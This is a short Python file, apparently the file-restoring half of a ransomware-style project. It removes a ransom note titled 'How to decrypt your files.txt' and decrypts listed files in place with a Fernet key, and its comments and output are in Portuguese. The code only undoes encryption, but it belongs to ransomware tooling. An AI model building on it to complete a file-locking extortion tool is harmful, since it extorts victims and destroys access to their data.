from cryptography.fernet import Fernet
import os

def deleteDecryptTxt(directory):
    os.remove(directory + '/' + 'How to decrypt your files.txt')

# Descriptografar os arquivos
def run(directory, items, key):
    f = Fernet(key)
    for item in items:
        with open(item, 'rb') as file:
            encrypted_data = file.read()
        decrypted_data = f.decrypt(encrypted_data)
        with open(item, 'wb') as file:
            file.write(decrypted_data)
    print(f"Todos os arquivos do diretório {directory} foram descriptografados com sucesso!")